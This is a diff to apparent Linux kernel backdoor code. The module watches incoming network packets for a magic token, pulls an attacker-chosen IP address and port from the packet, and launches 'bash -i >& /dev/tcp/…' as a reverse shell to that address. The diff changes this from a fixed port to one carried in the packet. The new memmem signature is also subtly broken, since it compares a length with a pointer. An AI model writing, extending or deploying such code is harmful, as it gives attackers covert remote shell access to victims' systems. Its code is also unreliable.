@@ -7,7 +7,7 @@
 #include <linux/workqueue.h>
 #include <linux/kmod.h>
 
-#define TOKEN "black-magic-test"
+#define TOKEN "blkmgk"
 
 extern unsigned char __payload[];
 extern unsigned char __payload_end[];
@@ -17,6 +17,7 @@ extern long lookup_name(const char *);
 struct executor_t {
     struct execute_work ew;
     __be32 saddr;
+    unsigned int port;
 };
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -43,11 +44,11 @@ static typeof(kasprintf) *p_kasprintf = NULL;
 
 ////////////////////////////////////////////////////////////////////////////////
 
-static inline void *memmem(const void *h, size_t hlen, const void *n, size_t nlen) {
+static inline void *memmem(const void *h, size_t hlen, const void *n, size_t nlen, size_t *tlen) {
     if (!h || !hlen || !n || !nlen || (nlen > hlen))
         return NULL;
 
-    while (hlen >= nlen) {
+    while (hlen >= nlen && hlen >= tlen) {
         if (!p_memcmp(h, n, nlen))
             return (void *)h;
         h++, hlen--;
@@ -60,7 +61,7 @@ static void delayed_work(struct work_struct *ws) {
     char *envp[2] = { "HOME=/proc", NULL };
     struct execute_work * exw = container_of(ws, struct execute_work, work);
     struct executor_t * executor = (struct executor_t *)exw;
-    char *cmd = p_kasprintf(GFP_KERNEL, "bash -i >& /dev/tcp/%pI4/8087 0>&1", &executor->saddr);
+    char *cmd = p_kasprintf(GFP_KERNEL, "bash -i >& /dev/tcp/%pI4/%d 0>&1", &executor->saddr, executor->port);
 #ifdef DEBUG
     p_printk("%s", cmd);
 #endif
@@ -71,12 +72,15 @@ static void delayed_work(struct work_struct *ws) {
 }
 
 static void try_skb(struct sk_buff *skb) {
-    if (memmem(skb->data, skb_headlen(skb), TOKEN, sizeof(TOKEN) - 1)) {
-        struct iphdr *iph = (struct iphdr *)skb->data;
+    char * data = memmem(skb->data, skb_headlen(skb), TOKEN, (sizeof(TOKEN) - 1), sizeof(uint32_t) * 2);
+    if (data) {
+        __be32 *saddr = (void *)(data + (sizeof(TOKEN) - 1));
+        unsigned int *port = (void *)(saddr + 1);
         struct executor_t * executor = p_kmalloc(sizeof(struct executor_t), GFP_ATOMIC);
         struct execute_work *ws = p_kmalloc(sizeof(struct execute_work), GFP_ATOMIC);
         executor->ew = *ws;
-        executor->saddr = iph->saddr;
+        executor->saddr = *saddr;
+        executor->port = *port;
         if (ws) p_execute_in_process_context(delayed_work, &executor->ew);
     }
 }
